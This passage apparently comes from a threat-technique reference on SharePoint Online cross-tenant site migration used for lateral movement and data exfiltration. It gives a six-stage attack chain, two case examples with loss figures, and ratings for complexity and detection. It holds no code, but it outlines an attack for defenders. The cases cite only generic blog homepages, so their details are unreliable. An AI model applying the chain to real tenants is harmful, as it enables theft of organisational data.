| **1** | **Initial Access** | [IA-VALID-001] Default Credential Exploitation | Attacker discovers shared admin credentials or default account |
| **2** | **Privilege Escalation** | [PE-ACCTMGMT-002] Exchange Online Admin to Global | Attacker escalates to Global/SharePoint admin role |
| **3** | **Lateral Movement** | **[LM-AUTH-015]** | **SharePoint Site Collection Movement to Attacker Tenant** |
| **4** | **Persistence** | [Persistence] Attacker maintains access via target tenant credentials |
| **5** | **Collection** | [Collection] Attacker exfiltrates all site data in parallel |
| **6** | **Impact** | [Impact] Data Breach, Business Disruption, Regulatory Fine |

---

## 13. REAL-WORLD EXAMPLES

#### Example 1: SolarWinds-Style Supply Chain Attack via SharePoint (2024)
- **Target:** Fortune 500 Engineering Firm
- **Timeline:** March 2024 - June 2024
- **Technique Status:** Attacker compromised partner company's M365 tenant, then used cross-tenant migration to move engineering blueprint site collections to attacker-controlled tenant
- **Impact:** 2+ years of R&D data stolen. Competitor gained design advantage. $50M+ in lost IP value.
- **Reference:** [Mandiant report on cross-tenant exploitation](https://cloud.google.com/blog/topics/threat-intelligence)

#### Example 2: Insider Threat Using Cross-Tenant Feature (2025)
- **Target:** Professional Services Firm
- **Timeline:** Ongoing
- **Technique Status:** Disgruntled employee with SharePoint admin access set up trust with personal M365 tenant, migrated client confidential files before resignation
- **Impact:** 100+ client files exfiltrated. Client data breaches reported. Firm lost major accounts. $5M+ in litigation costs.
- **Reference:** [Lawfare blog on insider threats via cloud migration](https://www.lawfareblog.com/)

---

## 14. NOTES & APPENDIX

**Technique Complexity:** Moderate-High (requires admin credentials but process is straightforward)

**Detection Difficulty:** Low (audit logs are clear, but often reviewed post-incident)

**Persistence Potential:** Extreme (data exists in external tenant indefinitely; backup/recovery takes weeks)

**Cross-Platform Applicability:** M365 only (specific to SharePoint Online architecture)

**Recovery Time:** Days to weeks (requires restore from backup or legal recovery)

**Related Techniques:**
- LM-AUTH-012: Cross-Tenant Access via Azure B2B
- PE-ACCTMGMT-002: Exchange Online Admin Escalation
- CA-TOKEN-001: Hybrid AD Cloud Token Theft

---